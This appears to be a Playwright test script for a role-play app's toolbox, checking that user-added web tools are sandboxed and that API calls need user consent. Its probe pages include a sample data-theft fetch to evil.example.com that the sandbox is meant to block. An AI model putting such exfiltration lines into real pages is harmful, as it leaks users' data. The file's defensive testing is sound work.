// 工具箱（apps/tools，ARCHITECTURE 4.247）
//
//   用户要求：很多小工具的集合，每个工具一块独立的页面，还可以自己添加工具；
//   自己添加的网页工具怕有恶意脚本 —— 关进盒子：读不到应用数据、连不上网、跳不走，
//   要角色、世界书由用户当场选，要存东西先过确认页，调接口每次先问、计入用量。
//
//   一、首页：五个内置工具与「我的工具」；应用商店的排法，搜索与分类
//   二、网页工具的盒子：读不到本地存储与外层页面、连不上外网、没开「允许调用接口」时请求一律拒绝
//   三、开了「允许调用接口」：每次先问；拒绝不花钱；同意才发，顶栏计数；「本次不再询问」之后不再弹
//   四、网页工具把自己跳走：当场拆掉
//   五、上次打开时卡死：不自动再跑，点「仍然运行」才跑
//   六、pick 与 save：用户当场选的那一个角色交进去；存角色先出确认页
//   七、提示词工具：{{输入项}} 就地替换，点一次调一次，结果进历史
//   八、分享：导出成文字再读回，允许调用接口不跟着包走；一段 HTML 读成网页工具
//   九、NPC 生成器：禁止项默认一个都不勾；勾了才进提示词；存入联系人并关联到主角
//   十、世界观生成器：每个模块按小类列出很多标签，可选、可加、可批量生成（一次请求）；选中的标签进提示词；
//       按模块切回结果；存为世界书经确认页，每个模块一个条目
//   十一、世界书生成器：本地审查查得出禁止句无替代、照搬原文、套路词；只开正文时一次请求
//   十二、番外生成器：本地编译不调接口，标签按语义词典翻译；在「我们」中建一则番外
//   十三、「联系」的关联角色页：「更多设置」跳到 NPC 生成器并带上那个角色
//   十四、盒子的外壳：CSP 在文档最前面、不许连外网；主屏自定义组件也用同一个盒子
//   十五、外部图片与字体（用户要求「要有可以打开外部图片的」「字体也要」）：网页工具默认可以用，开关关掉就不行；
//        开着时往里交角色之前提醒一句；主屏组件一律可以；编辑工具时开着的运行页不会被误判成「跳走」
import { BASE, EXE, chromium } from './_env.mjs';

const browser = await chromium.launch({ executablePath: EXE, args: ['--no-sandbox'] });
const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, permissions: ['clipboard-read', 'clipboard-write'] });
await ctx.route('**/src/site.js*', async r => {
  const res = await r.fetch();
  r.fulfill({ response: res, body: (await res.text()).replace(/accounts:\s*'[^']*'/, "accounts: ''") });
});
let reply = 'pong';
const hits = []; const bodies = [];
await ctx.route(/https:\/\/main\.example\.com\//, async route => {
  hits.push(1);
  const body = JSON.parse(route.request().postData() || '{}');
  bodies.push(body);
  if (body.stream) {
    return route.fulfill({ status: 200, contentType: 'text/event-stream',
      body: `data: ${JSON.stringify({ choices: [{ delta: { content: reply } }] })}\n\ndata: [DONE]\n\n` });
  }
  return route.fulfill({ status: 200, contentType: 'application/json',
    body: JSON.stringify({ choices: [{ message: { role: 'assistant', content: reply } }] }) });
});
// 数的是「真的往网络发出的请求」。被 CSP 拦下的请求 playwright 也会先报一个 request 事件，
// 随后以 ERR_BLOCKED_BY_CSP 失败，从来没到网络 —— 这种不算。沙盒里的请求不一定经过 route
// （可能直接出网失败），所以不靠 route 数
const evilReq = new Map();
ctx.on('request', r => { if (/evil\.example\.com/.test(r.url())) evilReq.set(r, r.url()); });
ctx.on('requestfailed', r => { if (/BLOCKED_BY_CSP|csp/i.test(r.failure()?.errorText || '')) evilReq.delete(r); });
const evil = { some: fn => [...evilReq.values()].some(fn), join: sep => [...evilReq.values()].join(sep) };
await ctx.route(/evil\.example\.com/, route => route.fulfill({ status: 200, body: 'x' }));

const page = await ctx.newPage();
const errs = []; page.on('pageerror', e => errs.push(e.message));
const R = []; const ok = (n, c, e) => { R.push({ n, pass: !!c }); console.log(`${c ? '  ok  ' : '  FAIL'} ${n}${c ? '' : '   << ' + (e ?? '')}`); };
await page.addInitScript(() => {
  window.__probe = [];
  window.addEventListener('message', e => { if (e.data && e.data.probe) window.__probe.push(e.data.probe); });
});
await page.goto(`${BASE}/index.html`);
await page.waitForTimeout(2000);
const ev = (fn, arg) => page.evaluate(fn, arg);
const wait = ms => page.waitForTimeout(ms);
const body = () => page.locator('.page').last().innerText();
const go = route => ev(async r => { const n = await import('/src/system/nav.js'); n.unlock(); n.openApp('tools', r); }, route);
const push = route => ev(async r => { const n = await import('/src/system/nav.js'); n.push(r); }, route);
const probes = () => ev(() => window.__probe.slice());
const clearProbes = () => ev(() => { window.__probe.length = 0; });
const until = async (fn, ms = 6000) => { const t = Date.now(); while (Date.now() - t < ms) { if (await fn()) return true; await wait(150); } return false; };

const ids = await ev(async () => {
  const { db } = await import('/src/system/db/index.js');
  const svc = await import('/src/system/ai/services.js');
  const p = svc.newChatPreset({ name: '主' });
  svc.updateChatPreset(p.id, { baseUrl: 'https://main.example.com/v1', apiKey: 'k', model: 'm', provider: 'openai' });
  svc.setActiveChat(p.id);
  const c = db.characters.create({ name: '阿岚', persona: '阿岚是一名灯塔看守人。', signature: '守着灯' });
  const chat = db.chats.create({ characterIds: [c.id], title: '' });
  return { char: c.id, chat: chat.id };
});

// ---- 一、首页 ----
await go('/');
await wait(600);
let t = await body();
ok('首页：五个内置工具都在', ['NPC 生成器', '世界观生成器', '世界书生成器', '番外生成器', '图床搭建教程'].every(x => t.includes(x)), t.slice(0, 300));
ok('首页：「我的工具」为空时给出添加入口', t.includes('我的工具') && t.includes('添加工具'));
ok('首页：应用商店排法，横滑的大卡片与每行一个「打开」', await page.locator('.tb-hero').count() === 5 && await page.locator('.tb-app .tb-get').count() === 5);
await page.locator('.tb-search input').fill('世界');
await wait(300);
const rows = await page.locator('.tb-app').allInnerTexts();
ok('首页：搜索只留名字或说明里带关键词的', rows.length === 3 && rows.every(x => x.includes('世界')) && await page.locator('.tb-hero').count() === 0, rows.join(' | '));
await page.locator('.tb-search input').fill('');
await page.locator('.tb-tags .chip', { hasText: '写作' }).click();
await wait(300);
ok('首页：按分类筛', await page.locator('.tb-app').count() === 1 && (await body()).includes('番外生成器') && !(await body()).includes('我的工具'));
await page.locator('.tb-tags .chip', { hasText: '全部' }).click();
await wait(200);

// ---- 二、盒子 ----
const PROBE = `<!DOCTYPE html><html><head><title>探针</title>
<script>window.blocked = []; document.addEventListener('securitypolicyviolation', e => blocked.push(e.effectiveDirective + ' ' + e.blockedURI));</script>
<style>@font-face { font-family: on; src: url(https://evil.example.com/on.woff2); } p { font-family: on; }</style>
</head><body><p>probe 字</p><img src="https://evil.example.com/pixel.png" alt=""><script>
const out = {};
try { localStorage.getItem('x'); out.ls = 'readable'; } catch (e) { out.ls = 'blocked'; }
try { out.parent = parent.document ? 'readable' : 'none'; } catch (e) { out.parent = 'blocked'; }
out.eira = typeof window.eira;
fetch('https://evil.example.com/steal?d=1').then(() => { out.fetch = 'sent'; }).catch(() => { out.fetch = 'blocked'; }).finally(() => {
  eira.ai('hi').then(v => { out.ai = 'ok:' + v; }).catch(e => { out.ai = 'err:' + e.message; })
    .finally(() => setTimeout(() => { out.blocked = blocked; parent.postMessage({ probe: out }, '*'); }, 1500));
});
</script></body></html>`;
const webId = await ev(async html => (await import('/src/system/toolbox.js')).create({ kind: 'web', name: '探针', html }).id, PROBE);
await push(`/t/${webId}`);
await until(async () => (await probes()).length > 0);
let p = (await probes())[0] || {};
ok('盒子：读不到本地存储', p.ls === 'blocked', JSON.stringify(p));
ok('盒子：碰不到外层页面', p.parent === 'blocked', JSON.stringify(p));
ok('盒子：window.eira 在', p.eira === 'object', JSON.stringify(p));
ok('盒子：连不上外网（fetch 被拦）', p.fetch === 'blocked', JSON.stringify(p));
await wait(300);
// 放行与否看 iframe 自己收到的 CSP 违规报告：被拦的一定报，没报的就是放行了。
// 不靠数网络请求 —— 沙盒 iframe 在单独的进程里，它的请求 playwright 不一定报得出来
ok('盒子：fetch 被 CSP 拦下（connect-src）', (p.blocked || []).some(x => /^connect-src .*steal/.test(x)), JSON.stringify(p.blocked));
ok('盒子：fetch 一次都没有到网络', !evil.some(u => u.includes('steal')), evil.join(','));
ok('外部图片：默认可以加载（没有被 CSP 拦）', !(p.blocked || []).some(x => /pixel\.png/.test(x)), JSON.stringify(p.blocked));
ok('外部字体：默认可以加载（没有被 CSP 拦）', !(p.blocked || []).some(x => /on\.woff2/.test(x)), JSON.stringify(p.blocked));
ok('没开「允许调用接口」：请求被拒，一次都没发', /未获准/.test(p.ai || '') && hits.length === 0, `${p.ai} hits=${hits.length}`);
t = await body();
ok('顶栏写明第三方工具、无法读取应用数据与联网', t.includes('第三方工具') && t.includes('无法联网'));

// ---- 三、允许调用接口 ----
await ev(async id => (await import('/src/system/toolbox.js')).update(id, { allowAI: true }), webId);
await ev(async () => (await import('/src/system/nav.js')).pop());
await wait(300);
await clearProbes();
reply = 'pong';
await push(`/t/${webId}`);
ok('调接口之前先问', await until(async () => (await page.locator('.sheet').innerText().catch(() => '')).includes('请求调用一次接口')));
ok('问的时候还没有发出去', hits.length === 0, `hits=${hits.length}`);
await page.locator('.sheet button', { hasText: /^拒绝$/ }).click();
await until(async () => (await probes()).length > 0);
p = (await probes())[0] || {};
ok('拒绝：工具收到拒绝，一次都没发', /已拒绝/.test(p.ai || '') && hits.length === 0, `${p.ai} hits=${hits.length}`);

await ev(async () => (await import('/src/system/nav.js')).pop());
await wait(300);
await clearProbes();
await push(`/t/${webId}`);
await until(async () => (await page.locator('.sheet').innerText().catch(() => '')).includes('请求调用一次接口'));
await page.locator('.sheet button', { hasText: /^调用$/ }).click();
await until(async () => (await probes()).length > 0);
p = (await probes())[0] || {};
ok('同意：发了一次，结果交回工具', p.ai === 'ok:pong' && hits.length === 1, `${p.ai} hits=${hits.length}`);
ok('顶栏计数：接口 1 次', (await body()).includes('接口 1 次'));
ok('用量账本记在「网页工具」名下', await ev(async () => {
  const u = await import('/src/system/ai/usage.js');
  return u.since(3600000).some(x => x.label === '工具箱 · 网页工具' && x.n >= 1);
}));

// 本次不再询问：同一次打开里第二次请求不弹
const TWICE = `<script>eira.ai('a').then(() => eira.ai('b')).then(v => parent.postMessage({ probe: { done: v } }, '*'))
  .catch(e => parent.postMessage({ probe: { err: e.message } }, '*'));</script>`;
const twiceId = await ev(async html => (await import('/src/system/toolbox.js')).create({ kind: 'web', name: '两次', html, allowAI: true }).id, TWICE);
await ev(async () => (await import('/src/system/nav.js')).pop());
await wait(300);
await clearProbes();
const before = hits.length;
await push(`/t/${twiceId}`);
await until(async () => (await page.locator('.sheet').innerText().catch(() => '')).includes('请求调用一次接口'));
await page.locator('.sheet button', { hasText: '不再询问' }).click();
ok('「本次打开期间不再询问」：第二次不再弹，两次都发出', await until(async () => (await probes()).some(x => x.done === 'pong'))
  && hits.length - before === 2, `${JSON.stringify(await probes())} hits=${hits.length - before}`);

// ---- 四、跳走 ----
const ESC = '<p>x</p><script>setTimeout(() => { location.href = "about:blank"; }, 300);</script>';
const escId = await ev(async html => (await import('/src/system/toolbox.js')).create({ kind: 'web', name: '跳走', html }).id, ESC);
await ev(async () => (await import('/src/system/nav.js')).pop());
await wait(300);
await push(`/t/${escId}`);
ok('工具把自己跳走：当场停止，写明原因', await until(async () => (await body()).includes('试图打开外部网页')), (await body()).slice(0, 200));
ok('跳走之后 iframe 已拆掉', await page.locator('.tb-frame').count() === 0);

// ---- 五、卡死之后 ----
await ev(async () => (await import('/src/system/nav.js')).pop());
await wait(300);
await ev(id => localStorage.setItem('phone.tool.open', id), webId);
await clearProbes();
await push(`/t/${webId}`);
await wait(600);
t = await body();
ok('上次打开时卡死：不自动运行，写明原因', t.includes('已暂停运行') && await page.locator('.tb-frame').count() === 0, t.slice(0, 200));
await page.locator('button', { hasText: '仍然运行' }).click();
await wait(500);
ok('点「仍然运行」才跑', await page.locator('.tb-frame').count() === 1);
ok('开着时记了一笔', await ev(id => localStorage.getItem('phone.tool.open') === id, webId));
await page.keyboard.press('Escape').catch(() => {});
await ev(async () => (await import('/src/system/nav.js')).pop());
await wait(400);
ok('正常离开：那一笔清掉', await ev(() => !localStorage.getItem('phone.tool.open')));

// ---- 六、pick 与 save ----
const PS = `<script>eira.pick('character').then(c => eira.save('character', { name: '新来的人', persona: '看守灯塔的学徒。', signature: '学徒' })
  .then(r => parent.postMessage({ probe: { picked: c.name, persona: c.persona, keys: Object.keys(c).sort().join(','), saved: !!r.id } }, '*')))
  .catch(e => parent.postMessage({ probe: { err: e.message } }, '*'));</script>`;
const psId = await ev(async html => (await import('/src/system/toolbox.js')).create({ kind: 'web', name: '选与存', html }).id, PS);
await clearProbes();
const nChars = await ev(async () => (await import('/src/system/db/index.js')).characters.count());
await push(`/t/${psId}`);
ok('pick：弹出选角色的面板', await until(async () => (await page.locator('.sheet').innerText().catch(() => '')).includes('交给「选与存」一个角色')));
ok('pick：开着外部图片与字体，交之前提醒内容可能随这些地址发出', (await page.locator('.sheet').innerText()).includes('随这些地址发出'));
await page.locator('.sheet .list-item', { hasText: '阿岚' }).click();
ok('save：先出确认页，内容给用户看', await until(async () => (await page.locator('.sheet').innerText().catch(() => '')).includes('新来的人')));
ok('确认之前没有存', await ev(async () => (await import('/src/system/db/index.js')).characters.count()) === nChars);
await page.locator('.sheet button', { hasText: '存为一个角色' }).click();
await until(async () => (await probes()).length > 0);
p = (await probes())[0] || {};
ok('pick：交进去的是选中的那一个的副本，只有那几项', p.picked === '阿岚' && p.keys === 'age,birthday,gender,name,persona,signature', JSON.stringify(p));
ok('save：确认后存进联系人', p.saved && await ev(async () => (await import('/src/system/db/index.js')).characters.all().some(c => c.name === '新来的人')));

// ---- 七、提示词工具 ----
reply = '这是结果';
const promptId = await ev(async () => (await import('/src/system/toolbox.js')).create({
  kind: 'prompt', name: '总结', prompt: 'Summarise this:\n{{内容}}',
  inputs: [{ id: 'a', label: '内容', type: 'long' }, { id: 'b', label: '角色', type: 'character' }],
}).id);
await ev(async () => (await import('/src/system/nav.js')).pop());
await wait(300);
await push(`/t/${promptId}`);
await wait(500);
await page.locator('.field', { hasText: '内容' }).locator('textarea').fill('一段话');
await page.locator('.tb-pick').click();
await wait(300);
await page.locator('.sheet .list-item', { hasText: '阿岚' }).click();
await wait(200);
const h0 = hits.length;
await page.locator('button', { hasText: /^运行$/ }).click();
ok('提示词工具：结果显示出来', await until(async () => (await body()).includes('这是结果')));
ok('提示词工具：点一次调一次', hits.length - h0 === 1, `${hits.length - h0}`);
const sent = JSON.stringify(bodies[bodies.length - 1] || {});
ok('{{内容}} 就地替换；没引用的角色接在后面', sent.includes('Summarise this:\\n一段话') && sent.includes('## 角色') && sent.includes('灯塔看守人'), sent.slice(0, 400));
ok('结果进了历史', await ev(async id => (await import('/src/system/toolbox.js')).runsOf(id).length, promptId) === 1);

// ---- 八、分享 ----
const share = await ev(async id => {
  const tb = await import('/src/system/toolbox.js');
  const txt = tb.toText({ ...tb.get(id), allowAI: true });
  const folded = txt.replace(/(-----BEGIN EIRA TOOL-----\n)(.{30})/, '$1$2\n  ');
  const back = tb.parse(`聊天里转了一手：\n${folded}\n以上`);
  const web = tb.parse('<!DOCTYPE html><html><head><title>计时器</title></head><body></body></html>');
  return { name: back.name, kind: back.kind, prompt: back.prompt, inputs: back.inputs.length, ai: 'allowAI' in back, webKind: web.kind, webName: web.name };
}, promptId);
ok('分享：导出的文字被折行、前后多字，照样读回', share.name === '总结' && share.kind === 'prompt' && share.inputs === 2 && /Summarise/.test(share.prompt), JSON.stringify(share));
ok('分享：允许调用接口不跟着包走', share.ai === false);
ok('分享：一段 HTML 读成网页工具，名字取 title', share.webKind === 'web' && share.webName === '计时器');

// ---- 九、NPC 生成器 ----
reply = JSON.stringify({ npcs: [
  { name: '陈渡', gender: '男', age: '40', signature: '修船的', relation: '邻居', reverse: '邻居', fields: { 外貌特征: '手上有油污', 性格特质: '沉默' } },
  { name: '林汐', gender: '女', age: '19', signature: '送信', relation: '雇主', reverse: '邮差', fields: { 外貌特征: '短发', 性格特质: '好奇' } },
] });
await go('/');
await wait(300);
await push(`/npc/char/${ids.char}`);
await wait(600);
t = await body();
ok('NPC：从带角色的地址进来，主角已选好', t.includes('阿岚') && t.includes('自动与该角色建立关系'), t.slice(0, 200));
let sys = '';
// 默认：禁止项一个都不勾，提示词里没有恋爱那一条
await page.locator('button', { hasText: '查看本次提示词' }).click();
await wait(300);
sys = await page.locator('.sheet').innerText();
ok('NPC：禁止项默认不勾，提示词里没有「对主角有恋爱倾向」', !sys.includes('对主角有恋爱倾向') && sys.includes('阿岚'), sys.slice(0, 200));
await page.locator('.sheet button', { hasText: '关闭' }).click();
await wait(300);
await page.locator('.chip', { hasText: '对主角有恋爱倾向' }).click();
await wait(200);
const h1 = hits.length;
await page.locator('button', { hasText: /^生成$/ }).click();
ok('NPC：生成两个，结果显示', await until(async () => (await body()).includes('陈渡') && (await body()).includes('林汐')));
ok('NPC：点一次调一次', hits.length - h1 === 1);
const npcSys = JSON.stringify(bodies[bodies.length - 1] || {});
ok('NPC：勾了才进提示词', npcSys.includes('对主角有恋爱倾向'));
await page.locator('button', { hasText: '存入联系人' }).click();
await wait(400);
const rel = await ev(async id => {
  const card = await import('/src/system/ai/tasks/card.js');
  const { db } = await import('/src/system/db/index.js');
  const r = card.relationsOf(id).map(x => db.characters.get(x.charId));
  return { n: r.length, names: r.map(c => c?.name).join(','), npc: r.every(c => c?.isNpc), persona: r[0]?.persona || '' };
}, ids.char);
ok('NPC：存入联系人，并关联到主角', rel.n === 2 && /陈渡/.test(rel.names) && rel.npc, JSON.stringify(rel));
ok('NPC：人设由勾选的字段拼成', /外貌特征：/.test(rel.persona), rel.persona);
ok('NPC：这一批进了历史', await ev(async () => (await import('/src/system/toolbox.js')).runsOf('npc').length) === 1);

// ---- 十、世界观 ----
reply = '## 世界基础\n与现实相似，二十年前发现了读取梦境的技术。\n\n## 历史因果\n一次泄露事件之后出台了梦境保护法。';
await ev(async () => (await import('/src/system/toolbox.js')).setState('world', { name: '梦境时代', premise: '读取梦境', on: ['basis', 'history'] }));
await go('/');
await wait(300);
await push('/world');
await wait(500);
ok('世界观：按钮下写明一次请求', (await body()).includes('点一次调用 1 次接口'));
// 展开「世界基础」：按小类列出很多标签
await page.locator('.tb-wmod-head', { hasText: '世界基础' }).click();
await wait(300);
const nChips = await page.locator('.tb-wmod-body .chip').count();
ok('世界观：展开模块，按小类列出很多标签', nChips >= 40 && (await body()).includes('时代') && (await body()).includes('社会形态'), `${nChips}`);
await page.locator('.tb-wmod-body .chip', { hasText: /^近未来$/ }).click();
const eraField = page.locator('.tb-wmod-body .field', { hasText: '时代' }).first();
await eraField.locator('input').fill('潮汐纪元');
await eraField.locator('button', { hasText: '添加' }).click();
await wait(200);
ok('世界观：自己加的标签出现在那一类里并直接选中', await eraField.locator('.chip.is-active', { hasText: '潮汐纪元' }).count() === 1);
ok('世界观：模块卡片上写着已选几个', (await page.locator('.tb-wmod-head', { hasText: '世界基础' }).innerText()).includes('已选 2 个标签'));
// 批量生成：一次请求，不重复已有的
reply = JSON.stringify(['近未来', '海上城邦时代', '冰河之后']);
const hg = hits.length;
await page.locator('.tb-wmod-body button', { hasText: '批量生成标签' }).click();
await wait(300);
await page.locator('.sheet button', { hasText: /^生成$/ }).click();
ok('世界观：批量生成标签，列出新标签且去掉已有的', await until(async () => (await page.locator('.sheet').innerText()).includes('海上城邦时代'))
  && !(await page.locator('.sheet .list-item').allInnerTexts()).some(x => x.trim() === '近未来'));
ok('世界观：批量生成只调一次', hits.length - hg === 1);
const tagSys = JSON.stringify(bodies[bodies.length - 1] || {});
ok('世界观：批量生成的请求带上了模块、小类与已有标签', tagSys.includes('世界基础') && tagSys.includes('时代') && tagSys.includes('潮汐纪元'), tagSys.slice(0, 300));
await page.locator('.sheet button', { hasText: '加入标签' }).click();
await wait(300);
ok('世界观：生成的标签进了那一类', await eraField.locator('.chip', { hasText: '冰河之后' }).count() === 1);
reply = '## 世界基础\n与现实相似，二十年前发现了读取梦境的技术。\n\n## 历史因果\n一次泄露事件之后出台了梦境保护法。';
const h2 = hits.length;
await page.locator('button', { hasText: /^生成$/ }).click();
ok('世界观：两个模块切回来了', await until(async () => (await body()).includes('梦境保护法')) && (await body()).includes('读取梦境的技术'));
ok('世界观：一次写完只调一次', hits.length - h2 === 1);
const worldSys = JSON.stringify(bodies[bodies.length - 1] || {});
ok('世界观：选中的标签写进提示词', worldSys.includes('近未来') && worldSys.includes('潮汐纪元') && worldSys.includes('Elements the user picked'), worldSys.slice(0, 200));
const nBooks = await ev(async () => (await import('/src/system/db/index.js')).lorebooks.count());
await page.locator('button', { hasText: '存为世界书' }).click();
ok('世界观：存为世界书先进确认页', await until(async () => (await body()).includes('导入世界书')), (await body()).slice(0, 200));
ok('确认之前没有入库', await ev(async () => (await import('/src/system/db/index.js')).lorebooks.count()) === nBooks);
await page.locator('button', { hasText: /保存 1 本/ }).click();
await wait(400);
const book = await ev(async () => {
  const { db } = await import('/src/system/db/index.js');
  const b = db.lorebooks.all().find(x => x.name === '梦境时代');
  return b ? { n: b.entries.length, titles: b.entries.map(e => e.comment).join(',') } : null;
});
ok('世界观：每个模块一个条目', book && book.n === 2 && /世界基础/.test(book.titles) && /历史因果/.test(book.titles), JSON.stringify(book));

// ---- 十一、世界书生成器 ----
const au = await ev(async () => {
  const lc = await import('/src/system/lorecheck.js');
  const q = '角色总是说我一直都在这种话，我很不喜欢，希望角色说话具体一点';
  const a = lc.audit({ question: q, body: '## 说话\n不要说空话。禁止使用套话。\n不要用比喻。\n角色总是说我一直都在这种话，我很不喜欢。\n## 场景\n仿佛整个世界都安静了。', format: 'natural' });
  const good = lc.audit({ question: q, body: '## 说话\n当角色表达关心时，说出一件具体的事，例如记得对方昨天没吃早饭。\n不要说空泛的保证，而是给出下一步要做的事。\n## 场景\n描写场景时写出一个具体的声音或气味。', format: 'natural' });
  const s = x => Object.fromEntries(x.items.map(i => [i.id, i.status]));
  return { bad: s(a), good: s(good), badScore: a.score, goodScore: good.score };
});
ok('本地审查：禁止句没给替代写法，查得出', au.bad.R1 !== 'pass' && au.good.R1 === 'pass', JSON.stringify(au));
ok('本地审查：照搬需求原文，查得出', au.bad.R3 !== 'pass' && au.good.R3 === 'pass', JSON.stringify(au));
ok('本地审查：套路词，查得出', au.bad.R8 === 'fail' && au.good.R8 === 'pass', JSON.stringify(au));
ok('本地审查：好的一版分数更高', au.goodScore > au.badScore);

reply = '## 说话\n当角色表达关心时，说出一件具体的事。';
await ev(async () => (await import('/src/system/toolbox.js')).setState('lore', { title: '说话规约', question: '角色说话空泛', outline: false }));
await go('/');
await wait(300);
await push('/lore');
await wait(500);
ok('世界书：只开正文时写明一次请求', (await body()).includes('共 1 次请求'));
const h3 = hits.length;
await page.locator('button', { hasText: '开始生成' }).click();
ok('世界书：第 1 版完成，带本地审查', await until(async () => (await body()).includes('第 1 版') && (await body()).includes('本地审查')));
ok('世界书：只调一次', hits.length - h3 === 1);
t = await body();
ok('世界书：导出只有 Eira 自己的格式，没有酒馆格式', t.includes('存为世界书') && t.includes('导出 TXT') && !/ST|酒馆|SillyTavern/.test(t));

// ---- 十二、番外 ----
await ev(async () => {
  const tb = await import('/src/system/toolbox.js');
  const S = await import('/src/system/sidestory.js');
  tb.setState('extra', { story: { ...S.blankStory(), title: '灯塔', brainDump: '暴雨夜两人被困在灯塔里。', tags: { mood: ['吃醋'] } } });
});
await go('/');
await wait(300);
await push('/extra');
await wait(500);
const h4 = hits.length;
await page.locator('button', { hasText: '编译提示词' }).click();
await wait(400);
t = await body();
ok('番外：本地编译不调接口', hits.length === h4);
ok('番外：脑洞在，标签按词典翻译成行为语言', t.includes('暴雨夜两人被困在灯塔里') && t.includes('注意力变化'), t.slice(0, 600));
await page.locator('button', { hasText: '在「我们」中写这则番外' }).click();
await wait(300);
await page.locator('.sheet .list-item', { hasText: '阿岚' }).click();
await wait(800);
const wk = await ev(async chat => {
  const { db } = await import('/src/system/db/index.js');
  const w = db.works.all().find(x => x.chatId === chat);
  return w ? { kind: w.kind, title: w.title, premise: w.premise } : null;
}, ids.chat);
ok('番外：在「我们」中新建了一则番外，提示词作为前提', wk && wk.kind === 'extra' && wk.title === '灯塔' && wk.premise.includes('暴雨夜'), JSON.stringify(wk));
ok('番外：跳到了「我们」', await ev(async () => (await import('/src/system/nav.js')).nav.get().appId) === 'us');

// ---- 十三、「联系」的更多设置 ----
await ev(async id => { const n = await import('/src/system/nav.js'); n.openApp('contact', `/npc/${id}`); }, ids.char);
await wait(600);
await page.locator('.list-item', { hasText: '更多设置' }).click();
await wait(700);
t = await body();
ok('联系：「更多设置」跳到 NPC 生成器并带上那个角色', t.includes('NPC 生成器') && t.includes('阿岚'), t.slice(0, 200));

// ---- 十四、盒子的外壳 ----
const w = await ev(async () => {
  const sb = await import('/src/system/sandbox.js');
  const out = sb.wrap('<!DOCTYPE html><html><head><script>alert(1)</script></head></html>');
  return { head: out.slice(0, 120), csp: out.indexOf('Content-Security-Policy'), script: out.indexOf('<script>'), sandbox: sb.SANDBOX, connect: /connect-src 'none'/.test(sb.CSP) };
});
ok('盒子：CSP 在文档最前面，排在它自己的脚本之前', w.csp > 0 && w.csp < w.script && w.head.startsWith('<!DOCTYPE html><meta http-equiv="Content-Security-Policy"'), JSON.stringify(w));
ok('盒子：不给 allow-same-origin，不许连外网', w.sandbox === 'allow-scripts' && w.connect);
const widgetSrc = await ev(async () => (await fetch('/src/screens/home/widgets.js')).text());
ok('主屏自定义组件：用同一个盒子（srcdoc + CSP），不再直接 src 一个文件', /srcdoc=\$\{wrap\(text/.test(widgetSrc) && !/src=\$\{url\} sandbox/.test(widgetSrc));

ok('主屏自定义组件：外部图片与字体可以用', /wrap\(text, \{ images: true \}\)/.test(widgetSrc));

// ---- 十五、外部图片的开关 ----
await go('/');
await wait(300);
const IMG = '<script>window.blocked = []; document.addEventListener("securitypolicyviolation", e => blocked.push(e.effectiveDirective + " " + e.blockedURI));</script><style>@font-face{font-family:x;src:url(https://evil.example.com/off.woff2)}p{font-family:x}</style><link rel="stylesheet" href="https://evil.example.com/off.css"><p>字</p><img src="https://evil.example.com/off.png"><script>setTimeout(() => parent.postMessage({ probe: { img: 1, blocked } }, "*"), 1500);</script>';
const imgId = await ev(async html => (await import('/src/system/toolbox.js')).create({ kind: 'web', name: '图片', html, allowImages: false }).id, IMG);
await clearProbes();
await push(`/t/${imgId}`);
await until(async () => (await probes()).length > 0);
const offBlocked = ((await probes())[0] || {}).blocked || [];
ok('关掉开关：外部图片、字体、样式表都被 CSP 拦下', ['img-src', 'style-src', 'font-src'].every(d => offBlocked.some(x => x.startsWith(d)))
  || (offBlocked.some(x => /off\.png/.test(x)) && offBlocked.some(x => /off\.css/.test(x))), JSON.stringify(offBlocked));
ok('关掉开关：一个都没有到网络', !evil.some(u => /off\.(png|woff2|css)/.test(u)), evil.join(','));
ok('关掉之后顶栏写「无法联网」', (await body()).includes('无法联网') && !(await body()).includes('除外部图片'));
const csp = await ev(async () => {
  const sb = await import('/src/system/sandbox.js');
  return { on: sb.cspOf({ images: true }), off: sb.cspOf({ images: false }) };
});
ok('开着时只多放开 https 图片、字体与样式表，脚本与网络请求不变', /img-src data: blob: https:/.test(csp.on)
  && /font-src data: https:/.test(csp.on) && /style-src 'unsafe-inline' https:/.test(csp.on) && !/https:/.test(csp.off)
  && csp.on.replace(/ https:/g, '') === csp.off && /connect-src 'none'/.test(csp.on) && /script-src 'unsafe-inline' 'unsafe-eval'(;|$)/.test(csp.on), JSON.stringify(csp));
// 运行页开着时去编辑（开关、HTML），回来不应被当成「跳走」
await ev(async id => (await import('/src/system/toolbox.js')).update(id, { allowImages: true, html: '<p>新的一版</p>' }), imgId);
await wait(900);
t = await body();
ok('编辑了开着的工具：换成新的一版，不误判为跳走', !t.includes('试图打开外部网页') && await page.locator('.tb-frame').count() === 1, t.slice(0, 200));

ok('没有页面错误', errs.length === 0, errs.join(' | '));
await browser.close();
const bad = R.filter(r => !r.pass);
console.log(`\n${R.length - bad.length}/${R.length} 通过`);
process.exit(bad.length ? 1 : 0);
